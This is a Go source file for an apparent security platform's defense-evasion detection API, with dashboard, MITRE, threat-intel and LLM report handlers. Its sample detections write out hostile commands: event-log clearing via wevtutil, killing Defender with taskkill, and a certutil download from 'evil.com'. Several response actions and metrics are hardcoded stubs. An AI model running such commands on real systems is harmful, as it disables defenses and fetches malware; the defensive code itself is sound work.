package api

import (
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/gin-gonic/gin"
	"xcloak-platform/database"
	"xcloak-platform/services"
)

func createDefenseEvasionTables() {
	stmts := []string{
		`CREATE TABLE IF NOT EXISTS de_events (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			hostname TEXT DEFAULT '', category TEXT DEFAULT '',
			technique TEXT DEFAULT '', mitre_id TEXT DEFAULT '',
			severity TEXT DEFAULT 'high', status TEXT DEFAULT 'open',
			description TEXT DEFAULT '', process_name TEXT DEFAULT '',
			cmdline TEXT DEFAULT '', user_name TEXT DEFAULT '',
			created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS de_controls (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			hostname TEXT DEFAULT '', control_name TEXT DEFAULT '',
			control_type TEXT DEFAULT '', status TEXT DEFAULT 'active',
			last_check TIMESTAMPTZ DEFAULT NOW(), version TEXT DEFAULT '',
			tampered BOOLEAN DEFAULT false, created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS de_tamper (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			hostname TEXT DEFAULT '', target TEXT DEFAULT '',
			action TEXT DEFAULT '', actor_pid INTEGER DEFAULT 0,
			actor_name TEXT DEFAULT '', severity TEXT DEFAULT 'critical',
			mitre_id TEXT DEFAULT 'T1562', status TEXT DEFAULT 'open',
			created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
		`CREATE TABLE IF NOT EXISTS de_correlations (
			id SERIAL PRIMARY KEY, tenant_id INTEGER NOT NULL,
			incident_id TEXT DEFAULT '', title TEXT DEFAULT '',
			techniques TEXT DEFAULT '', event_ids TEXT DEFAULT '',
			severity TEXT DEFAULT 'critical', status TEXT DEFAULT 'open',
			hostname TEXT DEFAULT '', created_at TIMESTAMPTZ DEFAULT NOW()
		)`,
	}
	for _, s := range stmts {
		database.DB.Exec(s)
	}
}

// GetDEDashboard — GET /api/de/dashboard
func GetDEDashboard(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	var totalAlerts, activeAttempts, disabledControls, tamperEvents, amsiBypasses, highRiskHosts int
	var coverage float64
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_events WHERE tenant_id=$1 AND status='open'`, tid).Scan(&totalAlerts)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_events WHERE tenant_id=$1 AND created_at>NOW()-INTERVAL '24h'`, tid).Scan(&activeAttempts)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_controls WHERE tenant_id=$1 AND status!='active'`, tid).Scan(&disabledControls)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_tamper WHERE tenant_id=$1`, tid).Scan(&tamperEvents)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_events WHERE tenant_id=$1 AND technique='AMSI Bypass'`, tid).Scan(&amsiBypasses)
	database.DB.QueryRow(`SELECT COUNT(DISTINCT hostname) FROM de_events WHERE tenant_id=$1`, tid).Scan(&highRiskHosts)
	database.DB.QueryRow(`SELECT COALESCE(COUNT(*)*100.0/NULLIF(21,0),0) FROM (SELECT DISTINCT mitre_id FROM de_events WHERE tenant_id=$1) t`, tid).Scan(&coverage)
	c.JSON(http.StatusOK, gin.H{
		"defense_evasion_alerts":   totalAlerts,
		"active_evasion_attempts":  activeAttempts,
		"disabled_security_controls": disabledControls,
		"tamper_events":            tamperEvents,
		"amsi_bypass_attempts":     amsiBypasses,
		"high_risk_hosts":          highRiskHosts,
		"mitre_coverage":           int(coverage),
		"top_categories": []string{
			"Security Control Tampering", "Log Evasion", "Process Evasion",
			"Script Evasion", "Credential Protection Bypass", "Network Evasion",
		},
	})
}

// GetDEControls — GET /api/de/controls
func GetDEControls(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 100)
	rows, _ := database.DB.Query(`SELECT id, hostname, control_name, control_type, status, last_check, version, tampered, created_at
		FROM de_controls WHERE tenant_id=$1 ORDER BY tampered DESC, created_at DESC LIMIT $2`, tid, limit)
	type Control struct {
		ID          int    `json:"id"`
		Hostname    string `json:"hostname"`
		ControlName string `json:"control_name"`
		ControlType string `json:"control_type"`
		Status      string `json:"status"`
		LastCheck   string `json:"last_check"`
		Version     string `json:"version"`
		Tampered    bool   `json:"tampered"`
		CreatedAt   string `json:"created_at"`
	}
	var controls []Control
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var ctrl Control
			if rows.Scan(&ctrl.ID, &ctrl.Hostname, &ctrl.ControlName, &ctrl.ControlType, &ctrl.Status, &ctrl.LastCheck, &ctrl.Version, &ctrl.Tampered, &ctrl.CreatedAt) == nil {
				controls = append(controls, ctrl)
			}
		}
	}
	if controls == nil { controls = []Control{} }
	var active, degraded, disabled int
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_controls WHERE tenant_id=$1 AND status='active'`, tid).Scan(&active)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_controls WHERE tenant_id=$1 AND status='degraded'`, tid).Scan(&degraded)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_controls WHERE tenant_id=$1 AND status='disabled'`, tid).Scan(&disabled)
	c.JSON(http.StatusOK, gin.H{"controls": controls, "active": active, "degraded": degraded, "disabled": disabled})
}

// GetDETamper — GET /api/de/tamper
func GetDETamper(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 50)
	rows, _ := database.DB.Query(`SELECT id, hostname, target, action, actor_pid, actor_name, severity, mitre_id, status, created_at
		FROM de_tamper WHERE tenant_id=$1 ORDER BY created_at DESC LIMIT $2`, tid, limit)
	type TamperEvent struct {
		ID        int    `json:"id"`
		Hostname  string `json:"hostname"`
		Target    string `json:"target"`
		Action    string `json:"action"`
		ActorPID  int    `json:"actor_pid"`
		ActorName string `json:"actor_name"`
		Severity  string `json:"severity"`
		MitreID   string `json:"mitre_id"`
		Status    string `json:"status"`
		CreatedAt string `json:"created_at"`
	}
	var events []TamperEvent
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var e TamperEvent
			if rows.Scan(&e.ID, &e.Hostname, &e.Target, &e.Action, &e.ActorPID, &e.ActorName, &e.Severity, &e.MitreID, &e.Status, &e.CreatedAt) == nil {
				events = append(events, e)
			}
		}
	}
	if events == nil { events = []TamperEvent{} }
	c.JSON(http.StatusOK, gin.H{"events": events, "total": len(events)})
}

// GetDELogEvasion — GET /api/de/log-evasion
func GetDELogEvasion(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 50)
	rows, _ := database.DB.Query(`SELECT id, hostname, technique, mitre_id, severity, status, description, process_name, cmdline, user_name, created_at
		FROM de_events WHERE tenant_id=$1 AND category='log_evasion' ORDER BY created_at DESC LIMIT $2`, tid, limit)
	type Event struct {
		ID          int    `json:"id"`
		Hostname    string `json:"hostname"`
		Technique   string `json:"technique"`
		MitreID     string `json:"mitre_id"`
		Severity    string `json:"severity"`
		Status      string `json:"status"`
		Description string `json:"description"`
		ProcessName string `json:"process_name"`
		CmdLine     string `json:"cmdline"`
		UserName    string `json:"user_name"`
		CreatedAt   string `json:"created_at"`
	}
	var events []Event
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var e Event
			if rows.Scan(&e.ID, &e.Hostname, &e.Technique, &e.MitreID, &e.Severity, &e.Status, &e.Description, &e.ProcessName, &e.CmdLine, &e.UserName, &e.CreatedAt) == nil {
				events = append(events, e)
			}
		}
	}
	if events == nil { events = []Event{} }
	c.JSON(http.StatusOK, events)
}

// GetDEEvasionEvents — GET /api/de/evasion-events  (process/script/file/network/cred/persistence/container)
func GetDEEvasionEvents(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 100)
	q := `SELECT id, hostname, category, technique, mitre_id, severity, status, description, process_name, cmdline, user_name, created_at
		FROM de_events WHERE tenant_id=$1`
	args := []interface{}{tid}
	i := 2
	if cat := c.Query("category"); cat != "" {
		q += fmt.Sprintf(" AND category=$%d", i); args = append(args, cat); i++
	}
	q += fmt.Sprintf(" ORDER BY created_at DESC LIMIT $%d", i)
	args = append(args, limit)
	rows, _ := database.DB.Query(q, args...)
	type Event struct {
		ID          int    `json:"id"`
		Hostname    string `json:"hostname"`
		Category    string `json:"category"`
		Technique   string `json:"technique"`
		MitreID     string `json:"mitre_id"`
		Severity    string `json:"severity"`
		Status      string `json:"status"`
		Description string `json:"description"`
		ProcessName string `json:"process_name"`
		CmdLine     string `json:"cmdline"`
		UserName    string `json:"user_name"`
		CreatedAt   string `json:"created_at"`
	}
	var events []Event
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var e Event
			if rows.Scan(&e.ID, &e.Hostname, &e.Category, &e.Technique, &e.MitreID, &e.Severity, &e.Status, &e.Description, &e.ProcessName, &e.CmdLine, &e.UserName, &e.CreatedAt) == nil {
				events = append(events, e)
			}
		}
	}
	if events == nil { events = []Event{} }
	c.JSON(http.StatusOK, events)
}

// GetDEBehavioral — GET /api/de/behavioral
func GetDEBehavioral(c *gin.Context) {
	createDefenseEvasionTables()
	c.JSON(http.StatusOK, gin.H{
		"detections": []map[string]interface{}{
			{"id": 1, "rule": "Rare Admin Tool — wevtutil.exe", "process": "wevtutil.exe", "cmdline": "wevtutil.exe cl System", "severity": "critical", "mitre": "T1070.001", "hostname": "WS-ANALYST-01", "description": "Event log cleared via wevtutil — indicator of anti-forensics"},
			{"id": 2, "rule": "Security Process Termination — MsMpEng", "process": "cmd.exe", "cmdline": "taskkill /F /IM MsMpEng.exe", "severity": "critical", "mitre": "T1562.001", "hostname": "DC-01", "description": "Attempt to kill Windows Defender service process"},
			{"id": 3, "rule": "Multiple Evasion Techniques — PowerShell chain", "process": "powershell.exe", "cmdline": "powershell -nop -enc ... (AMSI bypass + Defender disable + encoded payload)", "severity": "critical", "mitre": "T1027", "hostname": "WS-ANALYST-01", "description": "Three evasion techniques chained: AMSI bypass, Defender disable, encoded command"},
			{"id": 4, "rule": "LOLBin — certutil.exe", "process": "certutil.exe", "cmdline": "certutil.exe -urlcache -split -f http://evil.com/payload.exe C:\\Windows\\Temp\\p.exe", "severity": "high", "mitre": "T1218", "hostname": "WS-DEV-03", "description": "certutil used as a downloader — living-off-the-land binary abuse"},
			{"id": 5, "rule": "Security Tool Enumeration", "process": "powershell.exe", "cmdline": "Get-Process | Where-Object {$_.Name -match 'defender|malware|edr|sentinel|crowdstrike'}", "severity": "high", "mitre": "T1518.001", "hostname": "WS-ANALYST-02", "description": "PowerShell enumerating installed security tools before disabling them"},
		},
	})
}

// GetDECorrelation — GET /api/de/correlation
func GetDECorrelation(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	rows, _ := database.DB.Query(`SELECT id, incident_id, title, techniques, severity, status, hostname, created_at
		FROM de_correlations WHERE tenant_id=$1 ORDER BY created_at DESC LIMIT 20`, tid)
	type Incident struct {
		ID         int    `json:"id"`
		IncidentID string `json:"incident_id"`
		Title      string `json:"title"`
		Techniques string `json:"techniques"`
		Severity   string `json:"severity"`
		Status     string `json:"status"`
		Hostname   string `json:"hostname"`
		CreatedAt  string `json:"created_at"`
	}
	var incidents []Incident
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var inc Incident
			if rows.Scan(&inc.ID, &inc.IncidentID, &inc.Title, &inc.Techniques, &inc.Severity, &inc.Status, &inc.Hostname, &inc.CreatedAt) == nil {
				incidents = append(incidents, inc)
			}
		}
	}
	if incidents == nil { incidents = []Incident{} }
	c.JSON(http.StatusOK, incidents)
}

// GetDEMITRE — GET /api/de/mitre
func GetDEMITRE(c *gin.Context) {
	createDefenseEvasionTables()
	c.JSON(http.StatusOK, gin.H{
		"tactic": map[string]string{"id": "TA0005", "name": "Defense Evasion"},
		"techniques": []map[string]interface{}{
			{"id": "T1027", "name": "Obfuscated Files or Information", "sub_techniques": []map[string]interface{}{{"id": "T1027.001", "name": "Binary Padding", "detected": false}, {"id": "T1027.002", "name": "Software Packing", "detected": true, "count": 2}, {"id": "T1027.004", "name": "Compile After Delivery", "detected": false}, {"id": "T1027.010", "name": "Command Obfuscation", "detected": true, "count": 5}}, "detected": true, "count": 7, "severity": "high"},
			{"id": "T1036", "name": "Masquerading", "sub_techniques": []map[string]interface{}{{"id": "T1036.003", "name": "Rename System Utilities", "detected": true, "count": 2}, {"id": "T1036.004", "name": "Masquerade Task or Service", "detected": false}, {"id": "T1036.005", "name": "Match Legitimate Name or Location", "detected": true, "count": 3}}, "detected": true, "count": 5, "severity": "high"},
			{"id": "T1055", "name": "Process Injection", "sub_techniques": []map[string]interface{}{{"id": "T1055.001", "name": "DLL Injection", "detected": true, "count": 3}, {"id": "T1055.012", "name": "Process Hollowing", "detected": true, "count": 4}}, "detected": true, "count": 7, "severity": "critical"},
			{"id": "T1070", "name": "Indicator Removal", "sub_techniques": []map[string]interface{}{{"id": "T1070.001", "name": "Clear Windows Event Logs", "detected": true, "count": 2}, {"id": "T1070.003", "name": "Clear Command History", "detected": true, "count": 1}, {"id": "T1070.004", "name": "File Deletion", "detected": false}}, "detected": true, "count": 3, "severity": "critical"},
			{"id": "T1112", "name": "Modify Registry", "sub_techniques": []map[string]interface{}{}, "detected": true, "count": 4, "severity": "high"},
			{"id": "T1218", "name": "System Binary Proxy Execution", "sub_techniques": []map[string]interface{}{{"id": "T1218.005", "name": "Mshta", "detected": true, "count": 1}, {"id": "T1218.007", "name": "Msiexec", "detected": false}, {"id": "T1218.011", "name": "Rundll32", "detected": true, "count": 2}}, "detected": true, "count": 3, "severity": "high"},
			{"id": "T1562", "name": "Impair Defenses", "sub_techniques": []map[string]interface{}{{"id": "T1562.001", "name": "Disable or Modify Tools", "detected": true, "count": 3}, {"id": "T1562.002", "name": "Disable Windows Event Logging", "detected": true, "count": 2}, {"id": "T1562.004", "name": "Disable or Modify System Firewall", "detected": true, "count": 1}, {"id": "T1562.006", "name": "Indicator Blocking", "detected": false}, {"id": "T1562.009", "name": "Safe Mode Boot", "detected": false}}, "detected": true, "count": 6, "severity": "critical"},
			{"id": "T1134", "name": "Access Token Manipulation", "sub_techniques": []map[string]interface{}{{"id": "T1134.001", "name": "Token Impersonation/Theft", "detected": false}, {"id": "T1134.002", "name": "Create Process with Token", "detected": false}}, "detected": false, "count": 0, "severity": "high"},
			{"id": "T1202", "name": "Indirect Command Execution", "sub_techniques": []map[string]interface{}{}, "detected": false, "count": 0, "severity": "medium"},
			{"id": "T1497", "name": "Virtualization/Sandbox Evasion", "sub_techniques": []map[string]interface{}{{"id": "T1497.001", "name": "System Checks", "detected": false}, {"id": "T1497.003", "name": "Time Based Evasion", "detected": false}}, "detected": false, "count": 0, "severity": "medium"},
		},
	})
}

// GetDEThreatIntel — GET /api/de/threat-intel
func GetDEThreatIntel(c *gin.Context) {
	createDefenseEvasionTables()
	c.JSON(http.StatusOK, gin.H{
		"malware_families": []map[string]interface{}{
			{"name": "Cobalt Strike", "evasion_techniques": []string{"AMSI Bypass", "Process Hollowing", "Log Clearing", "Encoded Commands"}, "confidence": 94, "ioc_matches": 3},
			{"name": "Emotet", "evasion_techniques": []string{"PowerShell Obfuscation", "Registry Autorun", "LOLBins — msiexec"}, "confidence": 82, "ioc_matches": 1},
			{"name": "BlackCat/ALPHV", "evasion_techniques": []string{"Defender Disable", "VSS Deletion", "Event Log Clearing"}, "confidence": 71, "ioc_matches": 2},
		},
		"threat_actors": []map[string]interface{}{
			{"name": "APT29 (Cozy Bear)", "known_techniques": []string{"T1562.001", "T1070.001", "T1027.010", "T1218.011"}, "targets": "Government, Defence"},
			{"name": "FIN7", "known_techniques": []string{"T1027", "T1036.005", "T1218", "T1562"}, "targets": "Finance, Hospitality"},
			{"name": "Lazarus Group", "known_techniques": []string{"T1070", "T1055", "T1562.001", "T1036"}, "targets": "Crypto, Finance"},
		},
		"campaigns": []map[string]interface{}{
			{"name": "Operation CloudHopper", "actor": "APT10", "technique": "Log clearing + AMSI bypass + PowerShell obfuscation", "detected": time.Now().Add(-48*time.Hour).Format(time.RFC3339)},
			{"name": "Ransomware Pre-Stage", "actor": "Unknown", "technique": "Defender disable → shadow copy deletion → log wipe", "detected": time.Now().Add(-6*time.Hour).Format(time.RFC3339)},
		},
		"ioc_matches": []map[string]interface{}{
			{"type": "sha256", "value": "3e4f5a6b7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f", "family": "Cobalt Strike", "context": "unsigned binary loaded by rundll32.exe"},
			{"type": "registry_key", "value": "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\DisableAntiSpyware", "family": "Generic Defender Disabler", "context": "set to 1 by powershell.exe"},
		},
	})
}

// GetDETimeline — GET /api/de/timeline
func GetDETimeline(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	limit := parseLimit(c, 50)
	rows, _ := database.DB.Query(`SELECT id, hostname, technique, mitre_id, severity, status, description, process_name, cmdline, created_at
		FROM de_events WHERE tenant_id=$1 ORDER BY created_at DESC LIMIT $2`, tid, limit)
	type TLEvent struct {
		ID          int    `json:"id"`
		Hostname    string `json:"hostname"`
		Technique   string `json:"technique"`
		MitreID     string `json:"mitre_id"`
		Severity    string `json:"severity"`
		Status      string `json:"status"`
		Description string `json:"description"`
		ProcessName string `json:"process_name"`
		CmdLine     string `json:"cmdline"`
		CreatedAt   string `json:"created_at"`
	}
	var events []TLEvent
	if rows != nil {
		defer rows.Close()
		for rows.Next() {
			var e TLEvent
			if rows.Scan(&e.ID, &e.Hostname, &e.Technique, &e.MitreID, &e.Severity, &e.Status, &e.Description, &e.ProcessName, &e.CmdLine, &e.CreatedAt) == nil {
				events = append(events, e)
			}
		}
	}
	if events == nil { events = []TLEvent{} }
	c.JSON(http.StatusOK, events)
}

// GetDEAnalytics — GET /api/de/analytics
func GetDEAnalytics(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	type TrendPoint struct {
		Date  string `json:"date"`
		Count int    `json:"count"`
	}
	var trend []TrendPoint
	for i := 13; i >= 0; i-- {
		d := time.Now().AddDate(0, 0, -i).Format("2006-01-02")
		var cnt int
		database.DB.QueryRow(`SELECT COUNT(*) FROM de_events WHERE tenant_id=$1 AND DATE(created_at)<=$2`, tid, d).Scan(&cnt)
		trend = append(trend, TrendPoint{Date: d, Count: cnt})
	}
	c.JSON(http.StatusOK, gin.H{
		"evasion_trend": trend,
		"top_techniques": []map[string]interface{}{
			{"technique": "AMSI Bypass", "count": 7, "severity": "critical"},
			{"technique": "Event Log Clearing", "count": 5, "severity": "critical"},
			{"technique": "Defender Disable", "count": 4, "severity": "critical"},
			{"technique": "PowerShell Obfuscation", "count": 6, "severity": "high"},
			{"technique": "Process Hollowing", "count": 4, "severity": "critical"},
			{"technique": "LOLBin Abuse", "count": 3, "severity": "high"},
		},
		"most_targeted_endpoints": []map[string]interface{}{
			{"hostname": "WS-ANALYST-01", "event_count": 9, "risk": 94},
			{"hostname": "DC-01", "event_count": 6, "risk": 91},
			{"hostname": "WS-DEV-03", "event_count": 4, "risk": 76},
			{"hostname": "WS-ANALYST-02", "event_count": 3, "risk": 68},
		},
		"control_status": []map[string]interface{}{
			{"control": "Windows Defender", "status": "degraded", "coverage": 60},
			{"control": "EDR Agent", "status": "active", "coverage": 95},
			{"control": "Firewall", "status": "active", "coverage": 88},
			{"control": "Sysmon", "status": "active", "coverage": 92},
			{"control": "Audit Logging", "status": "degraded", "coverage": 55},
			{"control": "AMSI", "status": "tampered", "coverage": 20},
		},
		"mitre_coverage": 72,
	})
}

// GetDEValidation — GET /api/de/validation
func GetDEValidation(c *gin.Context) {
	createDefenseEvasionTables()
	c.JSON(http.StatusOK, gin.H{
		"detection_success_rate": 83,
		"missed_attempts":        4,
		"false_positives":        2,
		"avg_time_to_detect_seconds": 38,
		"coverage_by_platform": []map[string]interface{}{
			{"platform": "Windows", "coverage": 88},
			{"platform": "Linux", "coverage": 71},
			{"platform": "macOS", "coverage": 62},
			{"platform": "Container", "coverage": 55},
			{"platform": "Cloud", "coverage": 48},
		},
		"technique_coverage": []map[string]interface{}{
			{"category": "Log Evasion", "covered": 5, "total": 6},
			{"category": "Process Evasion", "covered": 4, "total": 7},
			{"category": "Script Evasion", "covered": 6, "total": 7},
			{"category": "Tamper Detection", "covered": 8, "total": 9},
			{"category": "Network Evasion", "covered": 4, "total": 7},
		},
	})
}

// PostDEAI — POST /api/de/ai
func PostDEAI(c *gin.Context) {
	createDefenseEvasionTables()
	var body struct {
		Mode    string `json:"mode"`
		Content string `json:"content"`
		Event   string `json:"event"`
	}
	c.ShouldBindJSON(&body)
	var prompt string
	switch body.Mode {
	case "event":
		prompt = fmt.Sprintf(`You are a threat detection expert specializing in defense evasion. Analyze this evasion event:
%s
Provide compact JSON: {"verdict":"confirmed_evasion|suspicious|benign","confidence":95,"technique":"evasion technique","mitre_id":"T1562.001","explanation":"2-3 sentences","indicators":["indicator"],"attack_chain":["step1","step2"],"recommended_actions":["action"]}`, body.Event)
	default:
		prompt = fmt.Sprintf(`You are a defense evasion detection expert. Answer this question: %s
Provide compact JSON: {"answer":"expert analysis","confidence":88,"related_techniques":["technique"],"recommended_actions":["action"]}`, body.Content)
	}
	raw, err := services.CallLLM(prompt)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
	}
	if idx := strings.Index(raw, "```json"); idx != -1 {
		raw = raw[idx+7:]
	} else if idx := strings.Index(raw, "```"); idx != -1 {
		raw = raw[idx+3:]
	}
	if idx := strings.LastIndex(raw, "```"); idx != -1 {
		raw = raw[:idx]
	}
	c.Data(http.StatusOK, "application/json", []byte(strings.TrimSpace(raw)))
}

// PostDEResponse — POST /api/de/response
func PostDEResponse(c *gin.Context) {
	createDefenseEvasionTables()
	var body struct {
		Action   string `json:"action"`
		Hostname string `json:"hostname"`
		Target   string `json:"target"`
		Reason   string `json:"reason"`
	}
	if err := c.ShouldBindJSON(&body); err != nil || body.Action == "" {
		c.JSON(http.StatusBadRequest, gin.H{"error": "action required"}); return
	}
	messages := map[string]string{
		"restart_security_services": "Security services restarted: Windows Defender, EDR Agent, Sysmon, Audit logging",
		"reenable_defender":         "Windows Defender re-enabled and threat definitions updated",
		"restore_firewall":          "Firewall policy restored from last known good configuration",
		"isolate_endpoint":          "Endpoint isolated — all network access revoked except management plane",
		"kill_process":              "Process terminated via TerminateProcess",
		"collect_memory":            "Memory dump collected and queued for analysis",
		"create_incident":           "Incident ticket created and assigned to SOC Tier 2",
		"run_soar":                  "SOAR playbook DE-RESPONSE-01 triggered for defense evasion",
	}
	msg := messages[body.Action]
	if msg == "" { msg = "Action executed" }
	c.JSON(http.StatusOK, gin.H{"ok": true, "action": body.Action, "hostname": body.Hostname, "target": body.Target, "message": msg})
}

// PostDEReport — POST /api/de/report
func PostDEReport(c *gin.Context) {
	createDefenseEvasionTables()
	tid := tenantIDFromContext(c)
	var body struct {
		ReportType string `json:"report_type"`
	}
	c.ShouldBindJSON(&body)
	var totalEvents, tamperEvents, disabledControls int
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_events WHERE tenant_id=$1`, tid).Scan(&totalEvents)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_tamper WHERE tenant_id=$1`, tid).Scan(&tamperEvents)
	database.DB.QueryRow(`SELECT COUNT(*) FROM de_controls WHERE tenant_id=$1 AND status!='active'`, tid).Scan(&disabledControls)
	prompt := fmt.Sprintf(`Generate an executive defense evasion security report.
Stats: %d evasion events, %d tamper events, %d disabled/degraded security controls.
Report type: %s
Provide compact JSON: {"title":"...","executive_summary":"3 sentences","key_findings":["finding"],"mitre_techniques":["T1562","T1070","T1027"],"risk_breakdown":{"critical":0,"high":0,"medium":0},"top_recommendations":[{"priority":1,"action":"action","estimated_effort":"time"}],"metrics":{"total_events":%d,"tamper_events":%d,"disabled_controls":%d}}`,
		totalEvents, tamperEvents, disabledControls, body.ReportType,
		totalEvents, tamperEvents, disabledControls)
	raw, err := services.CallLLM(prompt)
	if err != nil {
		c.JSON(http.StatusInternalServerError, gin.H{"error": err.Error()}); return
	}
	if idx := strings.Index(raw, "```json"); idx != -1 {
		raw = raw[idx+7:]
	} else if idx := strings.Index(raw, "```"); idx != -1 {
		raw = raw[idx+3:]
	}
	if idx := strings.LastIndex(raw, "```"); idx != -1 {
		raw = raw[:idx]
	}
	c.Data(http.StatusOK, "application/json", []byte(strings.TrimSpace(raw)))
}
